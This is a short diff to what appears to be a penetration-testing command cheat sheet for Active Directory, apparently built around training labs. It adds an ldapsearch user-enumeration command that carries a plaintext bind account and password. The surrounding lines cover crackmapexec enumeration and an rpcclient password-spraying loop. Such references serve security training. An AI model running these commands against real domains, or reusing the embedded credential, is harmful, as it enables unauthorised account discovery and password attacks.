@@ -2292,6 +2292,9 @@ crackmapexec smb 172.16.5.5 --users
 # Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
 
+# Uses ldapsearch to create list user domain
+ldapsearch -x -H ldap://10.10.172.250 -D 'kiosk@SKYLARK.com' -w 'XEwUS^9R2Gwt8O914' -b "DC=SKYLARK,DC=com" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+
 # Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner.
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 
